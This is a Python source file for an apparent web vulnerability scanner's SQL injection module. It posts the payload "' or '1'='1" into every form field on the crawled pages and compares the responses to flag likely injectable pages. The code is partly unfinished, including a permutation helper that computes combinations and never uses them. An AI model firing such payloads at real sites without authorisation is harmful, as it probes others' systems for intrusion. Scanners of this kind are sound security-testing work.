import httplib2
import itertools
from urlparse import urljoin, urlparse
from helper import has_form, parse_form, post_request, create_post_params, log_results
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "sqli"
EXPLOIT_CLASS = "SQL Injection"


class SQLIModule:
    """
    SQL Injection Module
    Checks for SQLI vulnerability
    """

    def __init__(self, url, pages):
        self.url = url
        self.pages = pages
        self.logs = {}

    def has_get_params(self, web_page):
        return urlparse(web_page).path != ""

    def craft_injection_form(self, forms):
        modifiable_form_input = []
        for form_input in forms:
            if form_input[0] != "csrftoken":
                modifiable_form_input.append(form_input[0])
        for i in range(len(forms)):
            combinations = list(itertools.combinations(modifiable_form_input,i+1))

    def scan(self):
        results = []
        get_param_pages = Set([])
        for web_page in self.pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            if has_form(response):
                forms = parse_form(response)
                original_response = post_request(web_page, forms)
                injection_forms = []
                # Change this to permutate
                # self.craft_injection_form(forms) In progress
                for form_input in forms:
                    if form_input[0] == "csrftoken": # We don't have incentive to change this
                        injection_forms.append(form_input)
                    else:
                        injection_forms.append((form_input[0], "' or '1'='1"))
                random_forms = []
                for form_input in forms:
                    if form_input[0] == "csrftoken": # We don't have incentive to change this
                        random_forms.append(form_input)
                    else:
                        random_forms.append((form_input[0], "absldkjf"))
                random_response = post_request(web_page, random_forms)
                new_response = post_request(web_page, injection_forms)
                if original_response != new_response and new_response != random_response: # That means that the webpage is different, possibly a successful case
                    print(web_page)
                    results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
            # elif self.has_get_params(web_page) an9d urlparse(web_page).path not in get_param_pages:
                # GET version


        self.logs = log_results(self.url, results, EXPLOIT_CLASS)
